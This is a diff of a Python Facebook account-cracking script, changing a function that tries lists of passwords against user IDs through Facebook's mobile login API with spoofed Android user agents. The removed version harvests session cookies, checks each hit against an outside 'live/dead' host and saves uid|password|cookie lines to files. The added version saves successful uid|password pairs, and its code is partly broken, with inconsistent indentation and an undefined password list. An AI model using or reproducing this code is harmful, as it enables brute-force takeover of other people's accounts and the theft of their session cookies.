@@ -995,15 +995,17 @@ def m1(idf,pwv):
 	except Exception as e:
 		pass
 def m2(idf,pwv):
-	global loop,oks
-	try:
-		for pas in pwv:
-			session = requests.Session()
-			animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-			sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-			sys.stdout.flush()
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme; FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
-			data = {
+        global loop
+        global ok
+        global agents
+        animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+        sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+        sys.stdout.flush()
+        try:
+                for ps in pasb:
+                        session = requests.Session()
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme; FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+                        data={
                         'adid': str(uuid.uuid4()),
                         'format': 'json',
                         'device_id': str(uuid.uuid4()),
@@ -1019,7 +1021,8 @@ def m2(idf,pwv):
                         'meta_inf_fbmeta': '', 
                         'currently_logged_in_userid': '0', 
                         'fb_api_req_friendly_name': 'authenticate'}
-			head = {
+
+                        head={
                         'User-Agent': ua, 
                         'Accept-Encoding': 'gzip, deflate', 
                         'Accept': '*/*', 
@@ -1032,39 +1035,25 @@ def m2(idf,pwv):
                         'X-FB-Connection-Type': 'unknown',
                         'Content-Type': 'application/x-www-form-urlencoded',
                         'X-FB-HTTP-Engine': 'Liger'}
-			po = session.post('https://b-api.facebook.com/auth/login', data=data, headers=head).json()
-			if 'session_key' in po:
-					uid = str(po['uid'])
-					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-					cookie = f"sb={ssbb};{ckkk}"
-					get_req = str(requests.get(f"https://livedeadsegs.pythonanywhere.com/segs_uid?uid={uid}").text)
-					if 'LIVE' in get_req:
-						print('\r\r\033[1;32m [DARK-OK] '+uid+' | '+pas)
-						print(' \33[1;33m[Cookies🍪] : '+cookie)
-						open('/sdcard/DARK/DARK-RANDOM-OK.txt','a').write(uid+'|'+pas+'\n')
-						open('/sdcard/DARK/DARK-RANDOM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
-						oks.append(uid)
-						break
-					if 'DEAD' in get_req:
-						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
-						file_path = os.path.join(folder_path, 'LOCK-IDS.txt')
-						break
-			elif 'www.facebook.com' in po['error']['message']:
-					uid = str(po['error']['error_data']['uid'])
-					print('\r\033[1;91m [DARK-CP] '+uid+' | '+pas+'\033[1;97m')
-					file_path = os.path.join(folder_path, 'DARK-CP.txt')
-					with open(file_path, 'a') as file:
-						file.write(uid+'|'+pas+'\n')
-					cps.append(uid)
-					break
-			else:
-				continue
-		loop+=1
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	except Exception as e:
-		pass
+
+                        url1="https://b-api.facebook.com/method/auth.login"
+                        BLACK=session.post(url1,data=data, headers=head).json()
+                        if 'session_key' in BLACK:
+                                uid = BLACK["uid"]
+                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
+                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
+                                ok.append(uid)
+                                break
+                        elif 'www.facebook.com' in str(BLACK):
+                                uid = BLACK["uid"]
+                                print(f'\r\r{G}[ATOM-OK]: {uid} | {ps}')
+                                open('/sdcard/ATOM-OK.txt','a').write(uid+'|'+ps+'\n')
+                                ok.append(uid)
+                                break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
 
 def m3(idf,pwv):
   global loop,ok,cp
